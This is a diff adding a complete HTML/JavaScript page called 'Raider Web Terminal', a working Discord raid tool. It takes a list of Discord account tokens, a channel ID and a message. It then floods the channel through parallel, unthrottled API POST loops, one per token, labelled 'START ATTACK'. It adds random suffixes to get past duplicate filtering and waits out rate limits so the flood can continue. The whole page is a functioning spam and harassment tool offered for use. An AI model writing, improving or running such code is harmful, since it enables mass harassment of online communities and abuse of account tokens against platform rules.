@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Raider Terminal</title>
+    <style>
+        :root {
+            --bg-dark: #1e1f22;
+            --bg-main: #313338;
+            --bg-input: #383a40;
+            --blurple: #5865f2;
+            --text-main: #dbdee1;
+            --text-muted: #b5bac1;
+            --danger: #f23f42;
+            --success: #23a55a;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'gg sans', 'Noto Sans', sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .card {
+            background-color: var(--bg-main);
+            width: 500px;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+        }
+
+        h1 { font-size: 20px; text-align: center; margin-bottom: 20px; color: white; }
+
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 12px; font-weight: bold; color: var(--text-muted); text-transform: uppercase; margin-bottom: 8px; }
+
+        textarea, input {
+            width: 100%;
+            background-color: var(--bg-input);
+            border: none;
+            border-radius: 4px;
+            color: white;
+            padding: 10px;
+            box-sizing: border-box;
+            outline: none;
+            font-size: 14px;
+        }
+
+        textarea:focus, input:focus { border: 1px solid var(--blurple); }
+
+        .controls { display: flex; gap: 10px; margin-top: 20px; }
+
+        button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            color: white;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+
+        .btn-start { background-color: var(--blurple); }
+        .btn-start:hover { background-color: #4752c4; }
+        .btn-stop { background-color: var(--danger); }
+        .btn-stop:hover { background-color: #d83c3e; }
+
+        #console {
+            margin-top: 20px;
+            height: 150px;
+            background-color: black;
+            border-radius: 4px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            overflow-y: auto;
+            color: #00ff00;
+        }
+
+        .log-error { color: var(--danger); }
+        .log-success { color: var(--success); }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>RAIDER WEB TERMINAL</h1>
+
+    <div class="form-group">
+        <label>Discord Tokens (1 line per token)</label>
+        <textarea id="tokens" rows="4" placeholder="Paste tokens here..."></textarea>
+    </div>
+
+    <div class="form-group">
+        <label>Channel ID</label>
+        <input type="text" id="channelId" placeholder="Enter Channel ID">
+    </div>
+
+    <div class="form-group">
+        <label>Message Content (\n for new line)</label>
+        <textarea id="message" rows="2" placeholder="Enter message..."></textarea>
+    </div>
+
+    <div class="form-group">
+        <label>Delay (ms) - 0 for max speed</label>
+        <input type="number" id="delay" value="0">
+    </div>
+
+    <div class="controls">
+        <button id="start" class="btn-start">START ATTACK</button>
+        <button id="stop" class="btn-stop">STOP</button>
+    </div>
+
+    <div id="console">Ready...</div>
+</div>
+
+<script>
+    let isRunning = false;
+    const consoleDiv = document.getElementById('console');
+
+    function log(msg, type = '') {
+        const span = document.createElement('div');
+        span.className = type;
+        span.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        consoleDiv.prepend(span);
+    }
+
+    const randomStr = () => Math.random().toString(36).substring(2, 8);
+
+    async function fire(token, channelId, message, delay) {
+        const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
+        
+        while (isRunning) {
+            const content = `${message} | ${randomStr()}`;
+            
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': token.trim(),
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content, tts: false })
+                });
+
+                if (res.status === 200 || res.status === 201) {
+                    log(`SUCCESS: ${token.substring(0, 10)}...`, 'log-success');
+                } else if (res.status === 429) {
+                    const data = await res.json();
+                    log(`RATELIMIT: Wait ${data.retry_after}s`, 'log-error');
+                    await new Promise(r => setTimeout(r, data.retry_after * 1000));
+                } else {
+                    log(`FAILED: ${res.status}`, 'log-error');
+                }
+            } catch (e) {
+                log("CORS Error / Connection Error", 'log-error');
+            }
+
+            if (delay > 0) await new Promise(r => setTimeout(r, delay));
+        }
+    }
+
+    document.getElementById('start').onclick = () => {
+        if (isRunning) return;
+        const tokens = document.getElementById('tokens').value.split('\n').filter(t => t.trim() !== '');
+        const channelId = document.getElementById('channelId').value.trim();
+        const message = document.getElementById('message').value.replace(/\\n/g, '\n');
+        const delay = parseInt(document.getElementById('delay').value);
+
+        if (!tokens.length || !channelId) {
+            alert("Check Tokens or Channel ID!");
+            return;
+        }
+
+        isRunning = true;
+        log("Attack started!", 'log-success');
+
+        tokens.forEach(t => {
+            // トークンごとに並列実行
+            fire(t, channelId, message, delay);
+        });
+    };
+
+    document.getElementById('stop').onclick = () => {
+        isRunning = false;
+        log("Attack stopped.", 'log-error');
+    };
+</script>
+
+</body>
+</html>
